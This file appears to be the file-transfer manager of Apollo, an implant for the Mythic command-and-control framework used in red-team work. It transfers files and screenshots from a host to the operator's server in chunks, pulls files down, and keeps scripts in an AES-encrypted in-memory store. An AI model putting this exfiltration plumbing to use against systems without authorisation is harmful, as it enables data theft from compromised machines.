using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Concurrent;
using System.IO;
using System.Linq;
using System.Threading;
using ApolloInterop.Classes.Cryptography;

namespace Apollo.Management.Files
{
    public sealed class FileManager : IFileManager
    {
        private int _chunkSize = 512000;
        private IAgent _agent;
        private IEncryptedFileStore _fileStore;

        public FileManager(IAgent agent)
        {
            _agent = agent;
            _fileStore = new EncryptedFileStore.EncryptedFileStore(
                new ICryptographicRoutine[]
                {
                    new AesRoutine(),
                    // In the future, we should allow composible encryption routines;
                    // however, due to how impersonation and DPAPI interact,
                    // we can't use DPAPI to encrypt files.
                    // new DpapiRoutine(System.Guid.NewGuid().ToByteArray()),
                });
        }

        internal class FileTransferTracker
        {
            private ConcurrentQueue<MythicTaskStatus> _messages = new ConcurrentQueue<MythicTaskStatus>();
            private AutoResetEvent _messageAvailable = new AutoResetEvent(false);

            internal void AddMessage(MythicTaskStatus message)
            {
                _messages.Enqueue(message);
                _messageAvailable.Set();
            }

            internal bool GetNextMessage(CancellationToken ct, out MythicTaskStatus message)
            {
                message = default(MythicTaskStatus);
                while (!ct.IsCancellationRequested)
                {
                    if (_messages.TryDequeue(out message))
                    {
                        return true;
                    }
                    WaitHandle.WaitAny(new WaitHandle[] { _messageAvailable, ct.WaitHandle });
                }
                return false;
            }
        }

        private ConcurrentDictionary<string, FileTransferTracker> _uploadMessageStore = new ConcurrentDictionary<string, FileTransferTracker>();
        private ConcurrentDictionary<string, FileTransferTracker> _downloadMessageStore = new ConcurrentDictionary<string, FileTransferTracker>();

        public string[] GetPendingTransfers()
        {
            return _uploadMessageStore.Keys.Concat(_downloadMessageStore.Keys).ToArray();
        }

        public void ProcessResponse(MythicTaskStatus resp)
        {
            if (_uploadMessageStore.TryGetValue(resp.ApolloTrackerUUID, out FileTransferTracker uploadTracker))
            {
                if (resp.ChunkNumber > 0 || resp.StatusMessage == "error")
                {
                    uploadTracker.AddMessage(resp);
                }
            }
            else if (_downloadMessageStore.TryGetValue(resp.ApolloTrackerUUID, out FileTransferTracker downloadTracker))
            {
                downloadTracker.AddMessage(resp);
            }
        }

        public bool PutFile(CancellationToken ct, string taskID, byte[] content, string originatingPath, out string mythicFileId, bool isScreenshot = false, string originatingHost = null)
        {
            using (MemoryStream source = new MemoryStream(content, false))
            {
                return PutFile(ct, taskID, source, content.LongLength, originatingPath, out mythicFileId, isScreenshot, originatingHost);
            }
        }

        public bool PutFile(CancellationToken ct, string taskID, Stream source, long sourceLength, string originatingPath, out string mythicFileId, bool isScreenshot = false, string originatingHost = null)
        {
            if (source == null || !source.CanRead)
            {
                throw new ArgumentException("Source stream must be readable.", nameof(source));
            }
            if (sourceLength < 0)
            {
                throw new ArgumentOutOfRangeException(nameof(sourceLength));
            }

            string uuid = Guid.NewGuid().ToString();
            int totalChunks = checked((int)Math.Ceiling((double)sourceLength / _chunkSize));
            int chunksSent = 0;
            long bytesRead = 0;
            mythicFileId = "";
            FileTransferTracker tracker = new FileTransferTracker();
            if (string.IsNullOrEmpty(originatingHost))
            {
                originatingHost = Environment.GetEnvironmentVariable("COMPUTERNAME");
            }
            _downloadMessageStore[uuid] = tracker;

            try
            {
                _agent.GetTaskManager()?.AddTaskResponseToQueue(new MythicTaskResponse
                {
                    TaskID = taskID,
                    Download = new DownloadMessage
                    {
                        TotalChunks = totalChunks,
                        FullPath = originatingPath,
                        Hostname = originatingHost,
                        IsScreenshot = isScreenshot,
                        TaskID = taskID,
                    },
                    ApolloTrackerUUID = uuid
                });

                while (tracker.GetNextMessage(ct, out MythicTaskStatus message))
                {
                    if (message.StatusMessage == "error")
                    {
                        return false;
                    }

                    if (!string.IsNullOrEmpty(message.FileID) && string.IsNullOrEmpty(mythicFileId))
                    {
                        mythicFileId = message.FileID;
                    }
                    else if (message.StatusMessage == "success")
                    {
                        chunksSent += 1;
                    }

                    if (chunksSent == totalChunks)
                    {
                        if (totalChunks == 0 && !string.IsNullOrEmpty(mythicFileId))
                        {
                            _agent.GetTaskManager()?.AddTaskResponseToQueue(new MythicTaskResponse
                            {
                                TaskID = taskID,
                                UserOutput = $"{{\"file_id\": \"{mythicFileId}\"}}"
                            });
                        }
                        return !ct.IsCancellationRequested;
                    }
                    if (chunksSent > totalChunks)
                    {
                        return false;
                    }

                    int chunkLength = (int)Math.Min(_chunkSize, sourceLength - bytesRead);
                    byte[] chunkData = ReadChunk(source, chunkLength);
                    bytesRead += chunkData.LongLength;
                    MythicTaskResponse response = new MythicTaskResponse
                    {
                        TaskID = taskID,
                        Status = $"Transferring chunk {chunksSent + 1} / {totalChunks}",
                        Download = new DownloadMessage
                        {
                            ChunkNumber = chunksSent + 1,
                            FileID = mythicFileId,
                            ChunkData = Convert.ToBase64String(chunkData),
                            TaskID = taskID
                        },
                        ApolloTrackerUUID = uuid
                    };
                    if (chunksSent == 0)
                    {
                        response.UserOutput = $"{{\"file_id\": \"{mythicFileId}\"}}";
                    }
                    _agent.GetTaskManager()?.AddTaskResponseToQueue(response);
                }
                return false;
            }
            finally
            {
                _downloadMessageStore.TryRemove(uuid, out FileTransferTracker _);
            }
        }

        public bool GetFile(CancellationToken ct, string taskID, string fileID, out byte[] fileBytes)
        {
            using (MemoryStream destination = new MemoryStream())
            {
                if (GetFile(ct, taskID, fileID, destination, out long _))
                {
                    fileBytes = destination.ToArray();
                    return true;
                }
            }
            fileBytes = null;
            return false;
        }

        public bool GetFile(CancellationToken ct, string taskID, string fileID, Stream destination, out long bytesWritten)
        {
            if (destination == null || !destination.CanWrite)
            {
                throw new ArgumentException("Destination stream must be writable.", nameof(destination));
            }

            string uuid = Guid.NewGuid().ToString();
            int nextChunkNumber = 1;
            int totalChunks = -1;
            bytesWritten = 0;
            FileTransferTracker tracker = new FileTransferTracker();
            _uploadMessageStore[uuid] = tracker;

            try
            {
                QueueUploadChunkRequest(taskID, fileID, uuid, nextChunkNumber);
                while (tracker.GetNextMessage(ct, out MythicTaskStatus message))
                {
                    if (message.StatusMessage != "success" ||
                        message.ChunkNumber != nextChunkNumber ||
                        (totalChunks > -1 && totalChunks != message.TotalChunks))
                    {
                        return false;
                    }

                    byte[] chunkData = Convert.FromBase64String(message.ChunkData ?? "");
                    destination.Write(chunkData, 0, chunkData.Length);
                    bytesWritten += chunkData.LongLength;
                    totalChunks = message.TotalChunks;

                    if (totalChunks <= 0 || message.ChunkNumber >= totalChunks)
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse
                        {
                            TaskID = taskID,
                            Status = "Using file...",
                        });
                        return !ct.IsCancellationRequested;
                    }

                    nextChunkNumber += 1;
                    QueueUploadChunkRequest(taskID, fileID, uuid, nextChunkNumber, totalChunks);
                }
                return false;
            }
            finally
            {
                _uploadMessageStore.TryRemove(uuid, out FileTransferTracker _);
            }
        }

        private void QueueUploadChunkRequest(string taskID, string fileID, string uuid, int chunkNumber, int totalChunks = -1)
        {
            _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse
            {
                TaskID = taskID,
                Status = totalChunks < 0 ? "Fetching File Chunk 1..." : $"Fetching File Chunk {chunkNumber} / {totalChunks}",
                Upload = new UploadMessage
                {
                    TaskID = taskID,
                    FileID = fileID,
                    ChunkNumber = chunkNumber,
                    ChunkSize = _chunkSize
                },
                ApolloTrackerUUID = uuid
            });
        }

        private static byte[] ReadChunk(Stream source, int chunkLength)
        {
            if (chunkLength <= 0)
            {
                throw new EndOfStreamException("Source stream ended before the declared length.");
            }

            byte[] chunkData = new byte[chunkLength];
            int bytesRead = 0;
            while (bytesRead < chunkLength)
            {
                int read = source.Read(chunkData, bytesRead, chunkLength - bytesRead);
                if (read == 0)
                {
                    throw new EndOfStreamException("Source stream ended before the declared length.");
                }
                bytesRead += read;
            }
            return chunkData;
        }

        public string GetScript()
        {
            return _fileStore.GetScript();
        }

        public void SetScript(string script)
        {
            _fileStore.SetScript(script);
        }

        public bool AddFileToStore(string keyName, byte[] data)
        {
            return _fileStore.TryAddOrUpdate(keyName, data);
        }

        public bool GetFileFromStore(string keyName, out byte[] data)
        {
            return _fileStore.TryGetValue(keyName, out data);
        }

        public void SetScript(byte[] script)
        {
            _fileStore.SetScript(script);
        }

        public string[] ListFiles()
        {
            return _fileStore.ListFiles();
        }
        public bool RemoveFile(string keyName)
        {
            return _fileStore.RemoveFile(keyName);
        }
    }
}
